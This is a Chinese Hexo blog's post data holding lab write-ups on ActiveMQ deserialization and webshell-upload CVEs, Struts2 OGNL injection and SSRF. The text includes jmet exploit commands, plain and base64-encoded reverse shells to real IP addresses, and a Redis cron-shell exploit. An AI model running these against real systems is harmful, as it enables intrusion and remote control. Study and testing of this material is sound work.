1.ActiveMQ未授权/默认帐号密码登录Activemq的默认开启端口是8161和61616（均可修改），其中8161是后台管理页面，61616是给Java用的TCP端口。可以直接尝试登录后台管理页面。默认账号密码为：admin/admin 2.ActiveMQ反序列化漏洞(CVE-2015-5254)影响版本：Apache ActiveMQ 5.0.0 - 5.12.1漏洞简析：该漏洞要想利用有一个前提条件，需要拿到后台权限，也就是在1的基础上进行。（注：当然也可以构造链接发给管理员诱使管理点击触发，非本文重点）该漏洞是由于程序没有现在可在代理中序列化的类，远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。 先来简单解释一下JAVA的序列化，如下图1所示： 图1 JAVA序列化 序列化就是将对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。JAVA提供了一个序列化的API接口： 1）可序列化的类需要实现java.io.Serializable接口 2）java.io.ObjectOutputStream.writeObject() 该方法用来写序列化的对象 3）java.io.ObjectInputStream.readObject()，read就是用来读序列化的对象 4）中间使用二进制协议来存储对象的状态 针对反序列化漏洞：如果从网络、文件、数据库等读取了不可信的数据，同时作为read方法的输入值，这个时候就会触发反序列化漏洞。至于为什么要序列化，哪些需要序列化等等问题，详情请见随后的反序列化漏洞章节。CVE-2015-5254漏洞利用过程： 1）构造（可以使用ysoserial）可执行命令的序列化对象 2）作为一个消息，发送给目标61616端口 3）访问web管理页面，读取消息，点击event列表中的事件链接，触发漏洞 使用工具：jmet（内置ysoserial，无须另外下载），该工具原理是使用ysoserial生成Payload并发送，可以选择ysoserial下gadget中的ROME或者最常见的CommonsCollections1都可以。具体攻击过程，详见下一部分。 3.ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088)影响版本：Apache ActiveMQ 5.0.0 - 5.13.x漏洞简析：ActiveMQ的fileserver允许用户通过PUT方法上传文件，将webshell利用代码上传至fileserver路径下，然后使用MOVE方法将webshell利用代码转移到可执行路径，获取webshell。（注：有看到一些文章说，利用OPTIONS先探测一下http允许的请求方法，看是否允许PUT和MOVE，实际测试时，发现只返回了PUT，但MOVE虽然是允许的，但在返回头中并没有体现，见下图2）（漏洞点在fileserver处，所以OPTIONS的时候，后边注意跟具体目录，否则返回信息失败）图2 OPTIONS查看允许的http请求 此时，并不能看到PUT和MOVE，感觉比较鸡肋（其实可以直接尝试性攻击，走不走OPTIONS这一步都是一样的） 0x03、漏洞检测 ActiveMQ未授权/默认帐号密码登录检测访问后台管理页面即可，默认账号密码admin/admin。重点在2和3上 ActiveMQ反序列化漏洞(CVE-2015-5254)已拿到管理权限的情况下。下载jmet，构造payload，向队列发送反序列化数据到消息队列中。 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar 下载jmet到攻击机上(注：首次使用的时候需要同目录下创建一个external文件夹，否则执行会出错） java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME [靶机IP] 61616 注：ROME也可以替换成CommonsCollections1，一样的效果。 图3 发送反序列化数据 注意，上图3中有个ID号，该ID就是访问Web页面需要触发的事件ID。访问http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event注：127.0.0.1：8161视具体情况进行替换。 图4 查看event事件列表 在图4中点击图3返回ID对应的事件号，进行漏洞触发。如下图5所示。 图5 点击事件触发漏洞 此时可以看到注入的命令是：touch /tmp/success，在/tmp/文档下边生成一个success文件。由于是自己搭的环境，这个时候可以进入环境中查看一下这个命令是否执行成功。如本环境利用的docker进行搭建。在activemq对应漏洞目录下依次执行 docker-compose exec activemq bash ls /tmp查看文件，如下图6所示： 图6 查看执行是否成功 实际测试中，这个时候不能切入到对方系统中，所以将命令可以替换成反弹shell的命令。如下：bash -i &gt;&amp; /dev/tcp/IP/12345 0&gt;&amp;1 （12345端口可任意进行替换，保证不冲突即可）再开启服务器监听：nc -lvvp 12345即可，如下图7所示： 图7 成功反弹shell 注：如果反弹不成功可能是JAVA Runtime.getRuntime().exec()中不能使用管道符，需要进行一次base64的编码。编码命令如下： bash -c {echo,payload的basse64编码}|{base64,-d}|{bash,-i}将上面的payload进行编码后： bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41NS4zMi4zOS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}最后完整的执行编码后的payload，如下所示： java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS41NS4zMi4zOS8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 127.0.0.1 61616此时可以上传自己的ssh公钥或者其他方式，进入系统进行提权等操作，可参考文章：https://www.cnblogs.com/backlion/p/9970516.html ActiveMQ fileserver远程代码执行漏洞(CVE-2016-3088)攻击过程可分为三步： 1）对fileserver进行PUT操作，上传webshell脚本 2）获取绝对目录，为下一步做准备(两种) 3）进行MOVE操作，触发漏洞抓包后，对fileserver进行PUT操作，此处PUT了一个webshell的内容，注意此处put的是一个txt文本，有时候直接put一个jsp文件可能会上传失败，所以命名为txt，此处任意格式只要能上传成功其实关系都不大，因为随后要进行MOVE操作，MOVE的同时可以修改后缀名。图8 对fileserver进行put操作 注：此时返回的是204，证明上传成功，如果上传失败会返回400等下一步爆目录，获取目录的方式有两种。 （1）访问web页面，直接获取访问URL：http://域名：端口/admin/test/systemProperties.jsp其中activemq.home下的就是需要获取到的目录。如下图9所示。 图9 获取目录方法1 （2）加入特殊字符，直接爆出来 如下图所示，PUT fileserver/test/%20%20，返回500 图10 获取目录方法2 目录获取到后，就可以将上传的webshell脚本移动到可执行路径下admin利用MOVE方法，加入Destination，返回204移动成功，如下图11所示 图11 移动成功 此时可以直接访问webshell存放的目录，执行任意命令，根据本webshell访问URL如下，此处利用的cmd是ls：http://127.0.0.1:8161/admin/hello.jsp?cmd=ls 图12 webshell命令执行 0x04、总结本文主要讲了ActiveMQ方面比较常见的漏洞，如ActiveMQ未授权或者默认账号密码弱口令登录，反序列化漏洞（CVE-2015-5254)，以及远程代码执行漏洞（CVE-2016-3088)。其中反序列化漏洞主要利用的jmet工具，用ysoserial生成可序列化的对象发送数据触发漏洞。远程代码执行则利用ActiveMQ下fileserver可进行PUT操作以及允许MOVE请求的特点，先对fileserver上传webshell，获取到目录后，再MOVE到可以执行jsp脚本的admin目录下触发漏洞。最后给出一张简易的图仅作记录参考： 图13 ActiveMQ漏洞逻辑图 0x05、参考文献综述：https://blog.csdn.net/cjx529377/article/details/81612319https://www.freebuf.com/column/161188.htmlhttps://vulhub.org/#/environments/反序列化（CVE-2015-5254）：https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdfhttps://www.jianshu.com/p/7c70b19ee4dfhttps://www.cnblogs.com/backlion/p/9970516.html远程代码执行（CVE-2016-3088）：https://blog.csdn.net/xg_ren/article/details/80776474https://paper.seebug.org/346/","categories":[],"tags":[{"name":"activemq","slug":"activemq","permalink":"http://yoursite.com/tags/activemq/"},{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"}]},{"title":"Struts2-045、046、048漏洞基础","slug":"struts2-045-046-048-vulnerability-basis","date":"2019-03-22T09:22:06.000Z","updated":"2019-03-26T02:48:10.639Z","comments":true,"path":"Foundation/struts2-045-046-048-vulnerability-basis/","link":"","permalink":"http://yoursite.com/Foundation/struts2-045-046-048-vulnerability-basis/","excerpt":"","text":"Struts2-045、046、048漏洞基础 0x00、涉及漏洞Struts2-045（CVE-2017-5638），影响版本Struts2.3.5~Struts2.3.31,Struts2.5.0~Struts2.5.1Struts2-046（CVE-2017-5638），影响版本同上Struts2-048（CVE-2017-9791），影响版本Struts2.3.x系列启用了struts2-struts1-plugin插件的版本 0x01、目的主要为了测试一个Struts2漏洞集成扫描工具，初步测试过程中发现了一些问题。所以顺带了解一下。搭建的环境是struts2.3.24版本，另一个是利用docker以及vulhub现成的环境。测试内容包含45、46、48这3个漏洞。但是工具最开始只能测出45，46。 0x02、原理在进入正题之前，先来了解一下最基础的东西。一个http请求包含3个部分，分别是： （1）请求行 （2）请求报头 （3）消息主体 http协议规定post提交的数据必须放在消息主体中，但是协议对编码方式没有规定。服务器端就根据请求头中的Content-Type字段来判断请求中消息主体是以哪种方式进行编码的，然后再对消息主体进行解码。具体的编码方式如下： （1）application/x-www-form-urlencoded最常见post提交数据的方式，以form表单形式提交数据。 （2）application/json以json串提交数据。 （3）multipart/form-data一般使用来上传文件举个例子，如下图1所示，是一个文件上传的包结构。 图1 文件上传包结构除了上文所讲的Content-Type以外，同时还存在一个Content-Disposition。再来解释一下Content-Disposition：是MIME协议的扩展，当浏览器收到请求头时，会激活文件下载对话框，请求头中的文件名会自动填充到对应的文本框中。 S2-045原理：成因（文字描述）：由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致攻击者可通过发送恶意数据包，利用该漏洞可以在服务器上执行任意命令。简单分析：当Content-Type中出现”multipart/form-data“时，会被认为有文件上传，然后调用struts2默认的文件上传组件Jakarta，通过组件漏洞载入OGNL代码并执行，达到远程调用的目的。 S2-046原理：与45的触发点相同，在使用文件上传功能时调用Jakarta组件，通过在http报文头部的Content-Disposition中构造恶意的filename字段，可导致RCE。利用条件：满足两点。 （1）Content-Type中包含multipart/form-data （2）Content-Disposition中filename包含OGNL语句。利用方式：2种情况。 （1）Content-Disposition的filename存在空字节。 （2）Content-Disposition的filename不存在空字节。当filename不存在空字节想要成功利用的时候，需要满足以下两个条件： A.Content-Length的长度值需要超过Struts2允许上传的最大值（2M） B.数据流需要经过JakartaStreamMultipartRequest。（即在struts.xml中添加配置）对于B的条件，是非默认情况下的配置，所以如果在filename不存在空字节的时候，利用成功的概率会大大降低。 S2-048原理：问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用是为了让struts2兼容struts1，所以将struts1的action封装成struts2的action在struts2上来运行使用。包里调用了getText()函数，而该函数能执行OGNL表达式，且该参数的输入点可以被用户直接进行控制。从而可以实现RCE攻击。利用方式：name字段添加POC 0x03、漏洞判断这部分主要是讲关于如何识别一个网站是用的Struts框架或者说是用的web框架类型。判断Struts的方法：（2个方案，仅限于初步判断，误判较高，但快速） （1）通过网页后缀来判断，如do.action等，这也是最常用的方法之一，不准的原因是JBOSS系统也是以do为后缀，但JBoss和tomcat不是一回事。 （2）通过actis，该方法最早是由kxlzx在好些年前提出来，要求的是对应的Action需要继承自ActionSupport类。利用方法： 如原始URL为：http://www.baidu.com检测所用URL则为：http://www.baidu.com/?actis=1111如果返回的页面出现异常，则可以判定目标是基于Struts2构建的。异常包括以下几种： A）网站页面可能会直接出现 404 或者 500 等错误。 B）网站页面上输出了与业务有关错误消息，或者1111被回显到了网站前端的页面上。 C）网站页面的内容结构发生了明显的变化 D）网站页面发生了301重定向 以上是专门针对Struts2框架的。下面介绍一些通用的探测Web应用框架的方法。使用工具： （1）Wappalyzer （2）Whatweb （3）BlindElephant 判别依据： （1）HTTP头查看HTTP响应数据包头的X-Powered-By字段：X-Powered-By: Mono //web应用框架是Mono （2）Cookies更可靠的方法是查看HTTP请求包（注意是请求包），每个框架特有的Cookies，例如：Cookie: CAKEPHP=sidfiwhefjdcsfowjoef; //web应用框架是CakePHP上面的工具里第三个目前没有使用过，通过前两个已经达到目的，因此主要从前两个来说。利用Wappalyzer的时候，对自己搭的环境，以及搭在远程服务器上的Struts2环境进行探测，发现并没有显示出想要的Struts框架来，如下图2所示： 图2 wappalyzer探测再利用whatweb进行探测，得出poweredby内容，获取框架信息，如下图3所示。 图3 whatweb探测 0x04、漏洞检测网上扫描工具比较多，就不细讲，这部分主要是抓包手动加POC，后面顺便简述一下工具的修改以及工具还存在的问题（测试范围仅针对这三种类型漏洞）。先来看一下POC，POC结构上大体相同，具体的部分根据编号不同有差异。以网上最常见的来说。如下图4所示。 图4 POC分为三部分： （1）触发文件漏洞，声明为文件上传%{(#_=’multipart/form-data’)注：开头是“%”，根据Struts代码，也可以替换成“$”，同样有效 （2）注入OGNL代码，通过ognl表达式静态调用获取ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性，并将获取的结果覆盖_memberAccess属性，绕过SecurityMemberAccess的限制。如下图5所示： 图5 注入ognl代码 （3）调用CMD命令，首先判断操作系统，win下调用cmd，linux下调用bash。至于执行的具体命令可自行进行修改。 图6 调用cmd命令先来看一下S2-045，注入点是在Content-Type中，抓包后进行修改。发现GET和POST请求都可以注入。如下图7和图8所示。图7中利用netstat命令，打印出端口开放情况。图8利用了whoami打印出本机名。 图7 端口开放情况 图8 post请求打印本机名测试S2-046的点主要在于利用filename，但是抓包改包的时候发现并不能正确回显（如下图9所示），在修改jakarta配置后，依旧不能正常回显，但用集成工具进行测试时，发现可以正常显示。注：S2-045以及S2-046都是上传位置，抓包在fileupload处（如下图10所示）。 图9 S2-046抓包改包无法正常回显 图10 S2-045及S2-046抓包点 测试S2-048的点在name字段，在进行本机测试的时候，利用网上公开最多的一个POC，是不能正常回显的，进行URL编码后依旧无效。但在远程搭建的服务器上可以响应该POC（如下图11所示，显示netstat命令不存在，这里集成工具测试时也有些问题）。本机搭的环境是048肯定存在的环境，但利用POC并不能测出48的漏洞，所以在对代码进行了多次测试后，利用了另一个POC如下图12所示。（奇怪的是，该POC测试远程服务器时，无回显） 图11 远程服务器响应S2=048常见POC 图12 非常用S2-048POC 图13 非常用POC测试本机S2-048结果注：S2-048的抓包位置在：intergration下的Struts 1 integration处，如下图14所示。 图14 S2-048抓包位置至此就是S2-045，S2-046，S2-048的手工抓包以及测试点。下面就来看一下集成工具方面存在的问题以及简单的修改。利用的工具是github上的一个集成工具：struts-scan，扫描范围较广，从S-05到S-057一些危害比较大的漏洞都有所涉及。但在测试本机的时候不能发现S2-048的漏洞（如下图15所示）。 图15 集成工具测试本机环境漏测S2-048所以看一下该工具具体代码实现细节。 图16 S2-048集成工具代码实现细节 图17 判别回显依据该代码实现逻辑比较简单（如上图16所示），就是在name字段加载POC，其中postdata处该字典各字段对应的正是在intergration/editGangster.action页面提交post请求时各框内需要填入的值，然后根据接收到的数据包的一些特征进行判断，这里判断是根据POC中命令来的，此处用到的命令是netstat -an，如上图17所示，是该POC的判别依据。可以看到该工具集成的POC就是网上最常用的那一个，经过上面的抓包测试，发现本机测试时该POC确实有问题，由于测试远程服务器上专门搭的S2-048采用另一个POC时也出现了问题，所以此处，需要对该代码进行修改的就是，同时利用两个POC进行测试，使之兼容。所以此处增添了一个部分S2-048-02，同时，为了方便测试，在回显的时候除了显示漏洞是否存在以外，针对漏洞存在的情况直接打印出命令执行后的结果。如下图18所示。 图18 修改集成工具后漏洞测试结果修改之后可以成功兼容。但根据该集成工具的实现逻辑以及实际过程中碰到的问题来看，该工具还需要进一步的修改。主要修改点在以下方面： （1）在S2-048测试中，可以看到vulnurl中在通过urlparse函数获取IP地址再结合添加的后缀是固定的值（固定值为struts2-showcase/integration/saveGangster.action），如下图19所示。 图19 S2-048测试URL问题就在于struts2-showcase实际上就是struts的war包解析后自动生成的文件夹，虽然默认情况下都为struts2-showcase，但实际开发中，只要有一点安全意识即可进行文件夹名字的修改。比如此处，将此war包改名为struts2，如下图20所示。 图20 struts的war包重命名此时测试，虽然输入的测试地址为struts2，但实际集成工具在进行发包时依旧会对struts2-showcase进行发包，如下图21所示。 图21 更改war包名字进行重测，测试结果失败此处其实应该结合目录字典爆破，可手工进行RCE攻击。 （2）判断回显依据上出现问题。判断仅根据执行netstat -an命令后回显的数据包中几种状态包括”Active Internet connections”，”Active Connections”，”活动连接”，”LISTEN”这四种进行漏洞判别，正常情况下netstat在linux和windows确实同时可使用，但不排除有些服务器所用的linux系统为最原生的系统，可能会出现该命令不存在的情况，只能执行ls等最基础的命令，如在上文中图11所示对远程服务器上的S2-048漏洞进行测试时出现的结果。该情况下漏洞并非不存在而是命令不存在，修改命令后，漏洞触发情况如下图22所示，对此执行whoami命令。 图22 远程S2-048漏洞执行whoami命令集成工具暂时修改内容只兼容了另外的测S2-048POC，之后有时间会进行其他方面的修改。 0x05、总结本文是针对Struts全家桶系列的基础内容之一，该文仅讲了Struts2-045，Struts2-046，Struts2-048三个漏洞，45和46的触发点都是在上传点位置，即fileupload处，而48的位置则是在integration处，45的漏洞，需要在Content-Type处执行文件上传功能，即multipart/form-data同时后面紧跟OGNL执行语句，而46的漏洞则除满足Content-Type：multipart/form-data同时在Content-Disposition下的filename处进行修改，这里边又包含两种情况，为含空字节和不含空字节。48的触发点则是在name字段，可利用的POC视具体情况。随后记叙了如何探测网站框架，插件或者whatweb等方式，然后对漏洞进行抓包测试，最后再针对集成工具进行一些测试修改以及针对代码逻辑结构提出了一些现目前存在的问题。最后，文末将给出一张简易的梳理图，如下图23所示。 图23 S-045，S2-046，S2-048逻辑梳理 0x06、参考文献https://blog.csdn.net/wutianxu123/article/details/82634738https://www.sohu.com/a/156177758_128736https://www.anquanke.com/post/id/85776http://blog.nsfocus.net/apache-struts2-vulnerability-analysis-protection-program/https://www.360zhijia.com/360anquanke/186708.htmlhttps://www.freebuf.com/vuls/129871.htmlhttp://netsecurity.51cto.com/art/201707/544837.htm（注：含漏洞搭建）https://www.freebuf.com/vuls/140410.htmlhttps://www.jianshu.com/p/356291fb26a2（S2-048另一POC）","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"Struts2","slug":"Struts2","permalink":"http://yoursite.com/tags/Struts2/"}]},{"title":"SSRF漏洞基础（一）","slug":"ssrf-vulnerability-basis1","date":"2019-02-21T06:49:32.000Z","updated":"2019-03-26T02:48:23.672Z","comments":true,"path":"Foundation/ssrf-vulnerability-basis1/","link":"","permalink":"http://yoursite.com/Foundation/ssrf-vulnerability-basis1/","excerpt":"","text":"0x01、漏洞描述SSRF是一种常见的Web漏洞，通常存在于需要请求外部内容的逻辑，当攻击者传入一个未经验证的URL，后端代码直接请求该URL，会造成SSRF漏洞。是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统，一大利用是探测内网端口开放信息，对于内网不是Web服务的，一般是返回端口对应服务的banner信息。Weblogic SSRF漏洞出现在UDDI组件（若安装Weblogic时没有选择UDDI组件则不会有该漏洞），更准确地说是UDDI包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。例如：一个正常的请求为：www.xxx.com/a.php?image=http://www.abc.com/1.jpg若将image后的网址换成与该服务器相连的内网服务器地址，若服务器端没有对获取的参数做出严格过滤及限制，则导致可以从外部服务器获取到内部服务器一定量的数据。注：IPv4协议下的内网IP段是预留出来的。10.0.0.0-10.255.255.255；172.16.0.0-172.31.255.255；192.168.0.0-192.168.255.255 0x02、漏洞检测SSRF漏洞常出现于： (1)通过URL地址来分享网页内容； (2)图片加载与下载； (3)URL关键字如：share,url,target,disploy,link,wap,link,sre,operator,imageurl等 检测方法通常通过排除法。 (1)若有图片等，通过新打开窗口上显示的URL判断，若地址栏是http://xxx.xxx.png,则无。 (2)抓包看是否有关键字如”url=http”(如下图1所示)，再进行后续判断，（如：SSRF是服务器端发起的，若加载一个图片，在本地浏览器中还存在对图片的请求，则无）在包里修改url的信息构造不同的请求，然后观察返回的状态码来探测信息。 图1 关键字“url”上图1对127.0.0.1的80端口返回了200。再次构造请求，使HTTP请求404，如下图2所示，返回状态码500，以及构造一个端口不开放的请求，使TCP连接被拒绝。同时也返回了500，如下图3所示。说明url参数后，该服务器确实进行了请求，可以初步判断该服务器存在SSRF漏洞。图2 请求不存在的页面返回500图3 请求未开放的端口返回500关于SSRF比较清晰的挖掘思路如下图所示：图4 SSRF挖掘如果网站进行了过滤，可以尝试进行绕过，常用且简单的绕过方式 (1)可以通过添加指向任意IP域名xip.io，如10.0.0.1.xip.io实际指向的是10.0.0.1。 (2)不知道内网IP段，常用127.0.0.1进行探测，如果网站对127.0.0.1进行了过滤，实际还可以用127.255.255.255尝试进行绕过。 (3)构造302跳转服务 Weblogic SSRF检测，根据状态来进行判断，请求开放的服务时，会得到一个response，具体的如下图5所示： 图5 SSRF服务探测（猪猪侠）上述四种状态均可以相互转化，如请求未开放——&gt;请求开放，可以通过更改请求的端口号来进行探测，从而回显不同的结果通过构造http://xxx.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://(内网IP)&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search对其进行探测，观察其回显状态，判断是否存在目标网段，Weblogic上的SSRF最主要的是operator参数，通过修改该参数探测内网地址和内网端口。漏洞页面显示如下图所示： 图6 Weblogic SSRF漏洞页面可以看到会有回显，常见的有5种状态，如下图所示： 图7 Weblogic SSRF回显状态并不是出现了图6的页面就表示存在该漏洞，需要根据回显状态进行判断，根据给出的POC内容判断，如下图所示。如果weblogic.uddi.client.structures.exception.XML_SoapException该段存在，且IOException on sendMessage该段不存在，则给出漏洞的提示。故状态4是不存在的，同时对状态4情况下更改内网段及端口号进行探测，发现回显状态没有变化。 图8 SSRF检测POC如果在不知道内网IP段的情况下，可以进行尝试访问Setup UDDI Explorer，如果开发者配置不当，该位置会直接给出内网地址的网段。如下图所示 图9 内网IP段探测0x03 漏洞利用该漏洞虽然在各大src上都被评为低位，但这是其本身危害有限，但该漏洞强大之处在于探测信息，从而方面下一步的利用，比如获取服务banner信息，探测内网telnet，ssh，redis等。探测到利用反弹shell，可以根据https://github.com/NoneNotNull/SSRFX最常见的一种是，探测6379端口开放Redis服务，利用Gopher协议攻击内网中的Redis，常见exp如下所示：redis-cli -h $1 flushallecho -e “nn/1 * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1nn”|redis-cli -h $1 -x set 1redis-cli -h $1 config set dir /var/spool/cron/redis-cli -h $1 config set dbfilename rootredis-cli -h $1 save 0x04 复现 Eg：利用环境里的远程文件包含漏洞包含一个执行端口扫描代码文件，再对内网端口开放情况进行探测。 图10 漏洞网址观察图10中的Get请求，发现一个参数language=lang_en.phpGet的请求：http://127.0.0.1/bWAPP_latest/bWAPP/rlfi.php?language=lang_en.php&amp;action=go利用language参数构造payload，远程文件包含并执行扫描脚本探测内网开放端口及服务先看一下扫描脚本部分代码段 图11 端口扫描代码段首先弹窗了一段字符串，测试一下文件包含后是否有执行，然后设置了一个参数ip，该参数即是构造Payload时，在POST DATA中的值，即外网主机不能探测到的内网IP地址构造Payload如下所示：POST：http://127.0.0.1/bWAPP/rlfi.php?language=http://xxx.xxx.xxx/evil/ssrf-1.txt&amp;action=goPOST DATA：ip=127.0.0.1由于该环境均搭载在本地上，所以IP地址均为127.0.0.1，实际操作中，每个IP地址代表的含义均不同。第一个http://127.0.0.1为正常的可以访问到的网址，language是参数，参数后边构造的http://xxx.xxx.xxx为扫描代码存放的地址，实际操作中，可以自己搭服务器，将扫描代码放置在自己的服务器上进行操作。POST DATA中的ip就是内网的ip地址，也就是扫描代码扫描的IP构造Payload后执行，执行结果如下图12，13所示： 图12 弹窗首先进行了一个弹窗，文件包含漏洞确实包含了该文件并执行。扫描的端口开放情况如下图所示： 图13 探测内网端口开放情况0x05 总结Weblogic的SSRF漏洞实际利用也大同小异，最常见的都是先进行内网端口方面的探测，再根据实际端口开放情况进行后续利用。SSRF本身并不会直接造成重大影响，但绕过了防火墙进入内网结合其他攻击方式，则可以对内网安全产生严重的威胁。此份报告仅对SSRF做了基础描述整理以及漏洞复现，SSRF漏洞实际操作中的利用也花样百出，可网上进行搜集多番探索。 0x05 参考文献浅谈CSRF漏洞：https://www.cnblogs.com/s0ky1xd/p/5859049.htmlhttp://zone.secevery.com/question/121https://www.t00ls.net/articles-41070.htmlhttps://www.jianshu.com/p/42a3bb2b2c2chttps://evilwing.me/2018/07/01/ssrf%E6%94%BB%E5%87%BB-%E8%AF%91%E6%96%87/https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html#http://blog.safebuff.com/2016/07/03/SSRF-Tips/http://www.mottoin.com/tech/115007.htmlhttps://www.freebuf.com/column/157466.htmlhttps://blog.csdn.net/chs007chs/article/details/52514888https://www.cnblogs.com/zuoxiaolongzzz/p/8906321.htmlhttps://www.cnblogs.com/ichunqiu/p/10286826.htmlhttps://github.com/NoneNotNull/SSRFX ——2019.2.20","categories":[],"tags":[{"name":"中间件","slug":"中间件","permalink":"http://yoursite.com/tags/中间件/"},{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"SSRF","slug":"SSRF","permalink":"http://yoursite.com/tags/SSRF/"}]},{"title":"TEST,HEXO","slug":"TEST-HEXO","date":"2019-01-22T07:58:58.000Z","updated":"2019-01-22T08:07:29.875Z","comments":true,"path":"undefined/TEST-HEXO/","link":"","permalink":"http://yoursite.com/undefined/TEST-HEXO/","excerpt":"","text":"This is a test article.","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-01-22T06:43:00.231Z","updated":"2019-01-22T06:43:00.231Z","comments":true,"path":"undefined/hello-world/","link":"","permalink":"http://yoursite.com/undefined/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}